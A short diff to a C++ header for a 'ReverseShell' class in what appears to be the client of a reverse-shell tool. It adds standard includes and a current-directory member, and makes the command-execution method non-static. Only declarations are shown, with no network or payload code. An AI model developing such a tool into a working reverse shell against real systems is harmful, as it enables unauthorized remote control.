@@ -2,12 +2,17 @@
 #define CLIENT_REVERSESHELL_H
 
 #include <string>
-
+#include <array>
+#include <memory>
+#include <iostream>
+#include <cstring>
 
 class ReverseShell {
+private:
+    std::wstring currentDirectory=L".";
 public:
     ReverseShell() = default;
-    static std::string executeCommand(const std::wstring&);
+    std::string executeCommand(const std::wstring&);
 };
 
 
